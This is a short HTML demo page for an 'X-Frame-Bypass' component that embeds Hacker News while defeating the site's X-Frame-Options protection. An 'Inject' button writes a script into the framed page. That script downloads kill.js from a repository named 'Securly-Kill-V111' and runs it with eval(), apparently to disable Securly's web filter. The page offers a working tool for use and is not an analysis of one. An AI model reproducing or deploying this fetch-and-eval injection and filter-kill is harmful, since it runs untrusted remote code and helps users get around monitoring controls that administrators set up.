<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="X-Frame-Bypass: Web Component extending IFrame to bypass X-Frame-Options: deny/sameorigin">
	<title>X-Frame-Bypass Web Component Demo</title>
	<style>
		html, body {
			margin: 0;
			padding: 0;
			height: 100%;
			overflow: hidden;
			position: relative;
		}
		iframe {
			display: block;
			width: calc(100% - 40px);
			height: calc(100% - 40px);
			margin: 20px;
		}
		img {
			position: absolute;
			top: 0;
			right: 0;
		}
		.inject-button {
			position: absolute;
			top: 10px;
			right: 10px;
			padding: 10px;
			background-color: red;
			color: white;
			border: none;
			cursor: pointer;
		}
	</style>
	<script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
	<script src="x-frame-bypass.js" type="module"></script>
	<script>
		function injectCode() {
			const iframe = document.querySelector('iframe');
			const bookmarkletCode = `
				fetch('https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js')
					.then(r => r.text())
					.then(r => eval(r));
			`;
			const script = document.createElement('script');
			script.text = `(${bookmarkletCode})();`;
			iframe.contentWindow.document.body.appendChild(script);
		}
	</script>
</head>
<body>
	<iframe is="x-frame-bypass" src="https://news.ycombinator.com/"></iframe>
	<a href="https://github.com/niutech/x-frame-bypass"><img src="https://s3.amazonaws.com/github/ribbons/forkme_right_gray_6d6d6d.png" alt="Fork me on GitHub"></a>
	<button class="inject-button" onclick="injectCode()">Inject</button>
</body>
</html>
